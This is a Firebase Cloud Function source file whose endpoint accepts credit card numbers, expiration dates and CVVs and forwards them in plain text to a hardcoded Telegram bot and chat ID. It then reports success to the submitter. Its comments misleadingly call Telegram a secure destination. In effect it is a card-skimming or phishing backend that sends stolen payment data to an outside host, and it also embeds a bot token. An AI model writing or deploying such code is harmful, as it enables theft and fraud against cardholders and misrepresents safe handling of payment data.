// index.js

const functions = require('firebase-functions');
const admin = require('firebase-admin');
const express = require('express');
const cors = require('cors');
const https = require('https');

admin.initializeApp();
const app = express();

// Automatically allow cross-origin requests
app.use(cors({ origin: true }));

// Submit credit card data
app.post('/submitCreditCardData', async (req, res) => {
  const { cardNumber, expirationDate, cvv } = req.body;

  // You can implement validation and data storage here
  // For security purposes, you should never store the full credit card data

  // Instead of storing the data, you can send it to Telegram or any other secure location.

  // Example: Send credit card data to a Telegram bot
  const message = `Credit Card Information\nCard Number: ${cardNumber}\nExpiration Date: ${expirationDate}\nCVV: ${cvv}`;
  sendTelegramMessage(message);

  res.status(200).json({ message: 'Credit card data received and processed.' });
});

// Function to send Telegram message
function sendTelegramMessage(message) {
  const telegramBotToken = '6523460876:AAGfTKNriMKxXc4AFtXI25tOeM9ygLtUlws';
  const chatId = '488701384';

  const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const postData = JSON.stringify({
    chat_id: chatId,
    text: message,
    parse_mode: 'MarkdownV2', // You can choose the format of the message
  });

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
  };

  const req = https.request(telegramApiUrl, options, (res) => {
    res.setEncoding('utf8');
    res.on('data', (chunk) => {
      console.log('Telegram Response: ' + chunk);
    });
  });

  req.on('error', (error) => {
    console.error('Error sending Telegram message:', error);
  });

  req.write(postData);
  req.end();
}

// Export the Express app as a Cloud Function
exports.app = functions.https.onRequest(app);

